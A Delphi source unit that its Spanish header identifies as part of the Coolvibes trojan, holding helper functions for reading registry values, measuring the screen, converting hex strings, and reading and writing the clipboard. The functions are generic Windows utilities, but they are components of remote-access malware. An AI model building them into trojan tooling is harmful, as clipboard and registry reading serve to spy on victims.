{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
que son usadas en varias partes del programa}
unit UnitFunciones;

interface

uses
  Windows,
  SysUtils;

  function GetClave(key:Hkey; subkey,nombre:String):String;
  function AnchuraPantalla():Integer;
  function AlturaPantalla():Integer;
  function HexToInt(s: string): Longword;
  function GetClipBoardDatas(): String;
  function SetClipBoardDatas(sData: PAnsiChar): String;
{  function FileTime2DateTime(FileTime: TFileTime): TDateTime;
En un fúturo es posible que se use esta función para mostrar la fecha de modificación de una clave}

implementation

function GetClave(key:Hkey; subkey,nombre:String):String;
var
  bytesread:dword;
  regKey: HKEY;
  valor:String;
begin
  Result:='';
  RegOpenKeyEx(key,PChar(subkey),0, KEY_READ, regKey);
  RegQueryValueEx(regKey,PChar(nombre),nil,nil,nil,@bytesread);
  SetLength(valor, bytesread);
  if RegQueryValueEx(regKey,PChar(nombre),nil,nil,@valor[1],@bytesread)=0 then
    result:=valor;
  RegCloseKey(regKey);
end;

function AlturaPantalla():Integer;
var
  Rectangulo: TRECT;
begin
  GetWindowRect(GetDesktopWindow(),
                Rectangulo);
  Result:=Rectangulo.Bottom-Rectangulo.Top;
end;

function AnchuraPantalla():Integer;
var
  Rectangulo: TRECT;
begin
  GetWindowRect(GetDesktopWindow(),
                Rectangulo);
  Result:=Rectangulo.Right-Rectangulo.Left;
end;

function HexToInt(s: string): Longword;
var
  b: Byte;
  c: Char;
begin
  Result := 0;
  s := UpperCase(s);
  for b := 1 to Length(s) do
  begin
    Result := Result * 16;
    c := s[b];
    case c of
      '0'..'9': Inc(Result, Ord(c) - Ord('0'));
      'A'..'F': Inc(Result, Ord(c) - Ord('A') + 10);
      else
        raise EConvertError.Create('No Hex-Number');
    end;
  end;
end;


function GetClipBoardDatas(): String;
var
Handle: THandle;
cBuffer: PAnsiChar;
begin
     If OpenClipboard(0) Then
     begin
          Handle:= GetClipBoardData(CF_TEXT);
          If Handle <> 0 Then
          begin
               cBuffer:= GlobalLock(Handle);
               If cBuffer <> nil Then
               begin
                    Result:= String(PChar(cBuffer));
                    GlobalUnlock(Handle);
               end;
          end;
     CloseClipBoard()
     end;
end;

function SetClipBoardDatas(sData: PAnsiChar): String;
var
Handle: THandle;
DataPtr: PAnsiChar;
begin
     If OpenClipBoard(0) Then
     begin
          EmptyClipboard;
          Handle:= GlobalAlloc(GMEM_MOVEABLE+GMEM_DDESHARE,lstrlen(sdata) + 1);
          DataPtr:= GlobalLock(Handle);
          CopyMemory(DataPtr,sData,lstrlen(sdata) );
          SetClipBoardData(CF_TEXT,Handle)
     end;
     GlobalFree(Handle);
     CloseClipboard();
end;

{function FileTime2DateTime(FileTime: TFileTime): TDateTime;
var
  LocalFileTime: TFileTime;
  SystemTime: TSystemTime;
begin
  FileTimeToLocalFileTime(FileTime, LocalFileTime);
  FileTimeToSystemTime(LocalFileTime, SystemTime);
  Result := SystemTimeToDateTime(SystemTime);
end;}

end.
